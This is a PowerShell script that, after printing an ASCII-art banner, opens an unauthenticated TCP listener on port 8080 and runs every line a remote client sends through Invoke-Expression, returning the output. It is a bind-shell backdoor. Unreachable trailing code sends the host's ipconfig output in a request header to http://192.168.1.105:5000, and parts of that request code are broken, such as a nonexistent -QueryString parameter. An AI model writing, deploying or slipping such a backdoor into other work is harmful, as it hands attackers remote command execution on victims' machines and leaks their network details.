Write-Host @"

          _____                    _____                    _____                   _______                 
         /\    \                  /\    \                  /\    \                 /::\    \                
        /::\    \                /::\    \                /::\    \               /::::\    \               
        \:::\    \              /::::\    \              /::::\    \             /::::::\    \              
         \:::\    \            /::::::\    \            /::::::\    \           /::::::::\    \             
          \:::\    \          /:::/\:::\    \          /:::/\:::\    \         /:::/~~\:::\    \            
           \:::\    \        /:::/__\:::\    \        /:::/__\:::\    \       /:::/    \:::\    \           
           /::::\    \       \:::\   \:::\    \      /::::\   \:::\    \     /:::/    / \:::\    \          
  ____    /::::::\    \    ___\:::\   \:::\    \    /::::::\   \:::\    \   /:::/____/   \:::\____\         
 /\   \  /:::/\:::\    \  /\   \:::\   \:::\    \  /:::/\:::\   \:::\    \ |:::|    |     |:::|    |        
/::\   \/:::/  \:::\____\/::\   \:::\   \:::\____\/:::/  \:::\   \:::\____\|:::|____|     |:::|    |        
\:::\  /:::/    \::/    /\:::\   \:::\   \::/    /\::/    \:::\   \::/    / \:::\    \   /:::/    /         
 \:::\/:::/    / \/____/  \:::\   \:::\   \/____/  \/____/ \:::\   \/____/   \:::\    \ /:::/    /          
  \::::::/    /            \:::\   \:::\    \               \:::\    \        \:::\    /:::/    /           
   \::::/____/              \:::\   \:::\____\               \:::\____\        \:::\__/:::/    /            
    \:::\    \               \:::\  /:::/    /                \::/    /         \::::::::/    /             
     \:::\    \               \:::\/:::/    /                  \/____/           \::::::/    /              
      \:::\    \               \::::::/    /                                      \::::/    /               
       \:::\____\               \::::/    /                                        \::/____/                
        \::/    /                \::/    /                                          ~~                      
         \/____/                  \/____/                                                                   
                                                                                                            

"@

# Set up TCP listener
$listener = New-Object System.Net.Sockets.TcpListener ([System.Net.IPAddress]::Any, 8080)
$listener.Start()

Write-Host "Listening for connections on port 8080..."

while ($true) {
    if ($listener.Pending()) {
        $client = $listener.AcceptTcpClient()
        Write-Host "Client connected: $($client.Client.RemoteEndPoint)"
        $stream = $client.GetStream()
        $reader = New-Object System.IO.StreamReader($stream)
        $writer = New-Object System.IO.StreamWriter($stream)
	$writer.Write("
		
          _____                    _____                    _____                   _______                 
         /\    \                  /\    \                  /\    \                 /::\    \                
        /::\    \                /::\    \                /::\    \               /::::\    \               
        \:::\    \              /::::\    \              /::::\    \             /::::::\    \              
         \:::\    \            /::::::\    \            /::::::\    \           /::::::::\    \             
          \:::\    \          /:::/\:::\    \          /:::/\:::\    \         /:::/~~\:::\    \            
           \:::\    \        /:::/__\:::\    \        /:::/__\:::\    \       /:::/    \:::\    \           
           /::::\    \       \:::\   \:::\    \      /::::\   \:::\    \     /:::/    / \:::\    \          
  ____    /::::::\    \    ___\:::\   \:::\    \    /::::::\   \:::\    \   /:::/____/   \:::\____\         
 /\   \  /:::/\:::\    \  /\   \:::\   \:::\    \  /:::/\:::\   \:::\    \ |:::|    |     |:::|    |        
/::\   \/:::/  \:::\____\/::\   \:::\   \:::\____\/:::/  \:::\   \:::\____\|:::|____|     |:::|    |        
\:::\  /:::/    \::/    /\:::\   \:::\   \::/    /\::/    \:::\   \::/    / \:::\    \   /:::/    /         
 \:::\/:::/    / \/____/  \:::\   \:::\   \/____/  \/____/ \:::\   \/____/   \:::\    \ /:::/    /          
  \::::::/    /            \:::\   \:::\    \               \:::\    \        \:::\    /:::/    /           
   \::::/____/              \:::\   \:::\____\               \:::\____\        \:::\__/:::/    /            
    \:::\    \               \:::\  /:::/    /                \::/    /         \::::::::/    /             
     \:::\    \               \:::\/:::/    /                  \/____/           \::::::/    /              
      \:::\    \               \::::::/    /                                      \::::/    /               
       \:::\____\               \::::/    /                                        \::/____/                
        \::/    /                \::/    /                                          ~~                      
         \/____/                  \/____/                                                                   
                                                                                                            

")
        while ($client.Connected) {
            # Display a prompt
	
            $writer.Write("PS > ")
            $writer.Flush()

            $data = $reader.ReadLine()
            if ($data -eq $null) {
                break
            }

            # Execute command and capture the output as a string
            $output = Invoke-Expression -Command $data | Out-String

            # Echo back to the client
            $writer.WriteLine($output)
            $writer.Flush()
        }

        Write-Host "Client disconnected: $($client.Client.RemoteEndPoint)"
        $client.Close()
    }

    Start-Sleep -Seconds 1
}

# Run ipconfig and capture the output
$ipConfigOutput = & ipconfig

# Convert the ipconfig output to string
$ip = $ipConfigOutput.ToString()

# Specify the URL and headers
$url = "http://192.168.1.105:5000"
$headers = @{
    "ip" = $ip
}

# Send the GET request with parameters "isfo" and headers
$response = Invoke-RestMethod -Uri $url -Method Get -Headers $headers -QueryString "isfo"

# Check the response
if ($response.StatusCode -eq 200) {
    Write-Host "Request successful"
    Write-Host "Response content: $($response.Content)"
} else {
    Write-Host "Request failed with status code $($response.StatusCode)"
    Write-Host "Response content: $($response.Content)"
}


$listener.Stop()
